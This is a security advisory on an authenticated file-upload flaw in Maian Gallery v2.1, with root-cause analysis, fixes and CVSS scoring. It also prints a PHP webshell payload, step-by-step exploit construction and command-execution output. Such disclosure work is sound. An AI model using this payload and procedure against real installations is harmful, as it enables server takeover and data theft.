# Maian Gallery v2.1 — Authenticated Admin RCE via Unrestricted File Upload (upload_thumbnail)

## 1. Overview

Maian Gallery v2.1 is a closed-source, self-hosted PHP photo gallery by Maian Media. Its admin "add images" flow uploads thumbnails via `move_uploaded_file()` with **no extension whitelist** (CWE-434). `filter_file_path()` preserves the original extension, so a `.php` file is written with a `.php` extension. The MIME gate uses the client-controlled `$_FILES['thumb']['type']` with `substr($type,0,5)=='image'` — spoofable without a polyglot. The upload directory `content/galleries/<folder>/<cat_folder>/` is web-reachable and ships without an `.htaccess` blocking PHP execution.

An authenticated admin therefore uploads a PHP webshell and executes arbitrary commands as the web-server user (uid 0 root in the research deployment). This is an independent 0-day — no public CVE exists for Maian Gallery as of the research date.

## 2. Vulnerability Summary

- **Type**: Authenticated arbitrary file upload → PHP code execution
- **Root cause 1 (CWE-434)**: `upload_thumbnail()` performs `move_uploaded_file()` with no extension whitelist (unlike the sibling `class.products.php` which has `$imgAllow`)
- **Root cause 2 (CWE-434/CWE-353)**: the MIME check trusts client-supplied `$_FILES['thumb']['type']` (`substr($type,0,5)=='image'`) instead of server-side content detection
- **Root cause 3 (CWE-94)**: the upload directory has no `.htaccess` preventing PHP execution, so the uploaded `.php` is directly web-routable
- **Result**: authenticated admin → upload `shell.php` (spoofed `image/gif`) → GET webshell → arbitrary command execution. CVSS 7.2.

## 3. Authentication Boundary

The framework auth gate `isWebmasterLoggedIn()` (`control/functions.php:4-16`):

```php
function isWebmasterLoggedIn() {
  if (isset($_SESSION['mgallery_admin_session'.ADM_KEY]) ||
      (isset($_COOKIE[COOKIE_NAME.ADM_KEY]) && $_COOKIE[COOKIE_NAME.ADM_KEY]==encrypt(SECRET_KEY))) {
    return true;
  }
}
```

`ADM_KEY = encrypt(SECRET_KEY) = sha1(SECRET_KEY)`, and `SECRET_KEY` is per-installation random — the cookie cannot be forged. Login (`admin/index.php:832-862`) compares `encrypt(ADM_USER)` with the submitted user. The auth gate is solid; the upload sink is behind the admin login (Target B, authenticated).

## 4. Attack Surface

- **Entry**: `admin/index.php?cmd=add_images` (authenticated)
- **Controllable**: `$_FILES['thumb']` (filename, content, client MIME type), `$_POST['cat']`, `$_POST['path']`, `$_POST['name']`
- **Sink**: `upload_thumbnail()` → `move_uploaded_file($temp, $folder . $file)`
- **Landing**: `content/galleries/<folder_name>/<cat_folder>/` — web-reachable, no `.htaccess`
- **Default deployment**: installer seeds `autothumb=0`, which uses the raw `move_uploaded_file` path (preserving `.php`); `autothumb=1` would use GD resize (not vulnerable)

## 5. Sink Identification

`admin/control/classes/class.images.php:222-241`:

```php
function upload_thumbnail($file, $temp, $folder) {
  if (is_uploaded_file($temp) && is_dir($folder) && is_writeable($folder)) {
    move_uploaded_file($temp, $folder . $file);   // SINK: no extension whitelist
    @chmod($folder . $file, 0644);
  }
}
```

`$file` is the `filter_file_path()` output, which preserves the original extension; `$folder` is the web-reachable gallery directory. The sibling `class.products.php` has an `$imgAllow` whitelist — gallery's `upload_thumbnail` does not, an inconsistency defect.

## 6. Source Identification & Controllability

`admin/index.php` `case "add_images"` (line 399-467):

```php
case "add_images":
  isWebmasterLoggedIn();                                   // auth gate (Target B)
  ...
  $path = $MGA_IMAGES->filter_file_path($_POST['path'][$i], ...);
  $oname = $_FILES['thumb']['name'][$i];                  // original filename
  $name = $MGA_IMAGES->filter_file_path($_FILES['thumb']['name'][$i], $_POST['cat'][$i], $prefix[1]);
  $type = $_FILES['thumb']['type'][$i];                   // client-controlled MIME
  ...
  if (is_dir(GPATH.'content/galleries/'.$SETTINGS->folder_name.'/'.getFolderName($_POST['cat'][$i]))) {
    if (!isset($s1_error) && substr($type,0,5)=='image' && $name && $temp
        && $MGA_IMAGES->upload_thumbnail($name, $temp, GPATH.'content/galleries/'.$SETTINGS->folder_name.'/'.getFolderName($_POST['cat'][$i]).'/')) {
```

`filter_file_path()` (`class.images.php:244-251`):

```php
function filter_file_path($file, $cat, $name) {
  $ext = strtolower(strrchr($file, "."));
  return $name . $this->getNextID() . '-' . $cat . $ext;   // .php preserved
}
```

The MIME check `substr($type,0,5)=='image'` trusts the client-supplied HTTP header — `image/gif` passes without any polyglot.

## 7. Data Flow

```
Attacker POST admin/index.php?cmd=add_images
  multipart: thumb[0]=shell.php (Content-Type: image/gif, body=<?php system($_GET['cmd'])?>)
             cat[0]=<existing_cat_id> process=1 name[0]=... path[0]=... upload[0]=1
  ↓ isWebmasterLoggedIn() passes (admin logged in)
  ↓ $name = filter_file_path('shell.php', cat, 'pic')
  ↓   $ext = '.php' (preserved)
  ↓   return 'pic<nextID>-<cat>.php'
  ↓ $type = 'image/gif' (spoofed)
  ↓ substr('image/gif',0,5)=='image' → true (MIME gate passes)
  ↓ upload_thumbnail('pic1-2.php', tmp, 'content/galleries/categories/testcat/')
  ↓   is_uploaded_file && is_dir && is_writeable → true
  ↓   move_uploaded_file(tmp, folder.'pic1-2.php')  → webshell written
  ↓ GET content/galleries/categories/testcat/pic1-2.php?cmd=id
  ↓   PHP executes system('id') → uid=0(root)       → RCE
```

## 8. Exploit Construction

1. **Login**: `POST admin/index.php?cmd=login` with `process=1&user=admin&pass=<ADM_PASS>` → session cookie.
2. **Find a category**: `GET admin/index.php?cmd=cats`, regex `cmd=cats&(?:amp;)?edit=(\d+)` to extract existing category IDs (the folder must exist on disk and be writable).
3. **Upload webshell**: `POST admin/index.php?cmd=add_images` multipart:
   - `thumb[0]` = `shell.php` (filename), `Content-Type: image/gif` (spoofed), body `<?php echo "GALLERY_RCE_PROOF:"; system($_GET["cmd"]); ?>`
   - `process=1`, `name[0]=shellimg`, `path[0]=shell.php`, `cat[0]=<cat_id>`, `upload[0]=1`
4. **Locate webshell**: `filter_file_path` output `pic{nextID}-{cat}.php`; brute small nextID range (1-30) across candidate folders.
5. **Execute**: `GET <webshell_url>?cmd=id` → `GALLERY_RCE_PROOF:uid=0(root)`.

## 9. Dynamic Verification

Environment: PHP 7.4.33 CLI built-in server, MySQL 8.0 container, gallery deployment with admin `admin`/`<admin-password>`, category id=2 (folder `testcat`, directory present).

Script run (pure stdlib):

```
$ python3 02-exploit.py http://127.0.0.1:8801 admin <admin-password> "id"
[+] login POST done (final status 200)
[+] candidate category ids: 5, 2
[+] upload POST done for cat 5 (status 200)
[+] webshell found: http://127.0.0.1:8801/content/galleries/categories/testcat/pic1-2.php
[+] ====== COMMAND OUTPUT ======
GALLERY_RCE_PROOF:uid=0(root) gid=0(root) groups=0(root)
[+] RCE CONFIRMED: webshell executed, marker present in response
```

Three independent verifications:

1. `id` → `uid=0(root) gid=0(root) groups=0(root)`
2. `whoami;hostname` → `root`
3. `echo GALLERY_RCE_PROOF_$(id -u) > /tmp/gallery_script_rce_PROOF.txt` → target-side `ls -la`: root-owned file, content `GALLERY_RCE_PROOF_0` (uid 0)

The research deployment ran PHP CLI as root; production deployments typically run as www-data/apache — still full RCE with web-server-user privileges.

## 10. Reachability & Impact

- **Reachability**: after admin login, `admin/index.php?cmd=add_images` is directly reachable (no CSRF token on login or add_images). `upload_thumbnail` requires `is_dir($folder) && is_writeable($folder)`; in real deployments, categories that already have images have writable directories (otherwise normal uploads would fail), so the default deployment satisfies all preconditions.
- **Impact**: arbitrary PHP code execution as the web-server user — gallery files, server data, and (commonly) the underlying host under attacker control.
- **Scope**: self-hosted Maian Gallery 2.1 installations.

## 11. Fix Recommendations

1. Add an extension whitelist to `upload_thumbnail` (`$imgAllow = array('jpg','jpeg','png','gif','webp')`), rejecting `.php`/`.phtml`/`.phar`.
2. Replace the client-supplied `$_FILES['type']` check with server-side `finfo_file()` content detection.
3. Add an `.htaccess` to upload directories (`php_flag engine off` or `Deny from all`) to prevent PHP execution.
4. Force `filter_file_path` to rename uploads to whitelisted extensions rather than preserving the original.

## 12. CWE & CVSS

- **CWE-434**: Unrestricted Upload of File with Dangerous Type (no extension whitelist)
- **CWE-353**: Failure to Check Support of Integrity Check Value (client-controlled MIME)
- **CWE-94**: Improper Control of Generation of Code (PHP webshell execution)
- **CVSS**: 7.2 — CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
